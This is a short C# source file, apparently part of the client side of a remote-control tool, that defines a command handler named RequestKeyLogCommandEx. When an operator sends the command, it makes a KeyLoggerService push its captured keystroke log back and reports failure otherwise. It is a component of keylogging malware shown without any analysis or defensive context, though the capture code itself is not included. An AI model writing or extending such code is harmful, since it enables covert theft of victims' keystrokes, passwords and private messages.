using Orcus.Plugins;
using Orcus.Plugins.StaticCommands;
using Orcus.StaticCommands.Client;

namespace Orcus.StaticCommands;

public class RequestKeyLogCommandEx : RequestKeyLogCommand
{
	public override void Execute(CommandParameter commandParameter, IFeedbackFactory feedbackFactory, IClientInfo clientInfo)
	{
		if (Program.AppContext.KeyLoggerService == null)
		{
			feedbackFactory.Failed();
		}
		else if (!Program.AppContext.KeyLoggerService.TryPushKeyLog())
		{
			feedbackFactory.Failed();
		}
	}
}
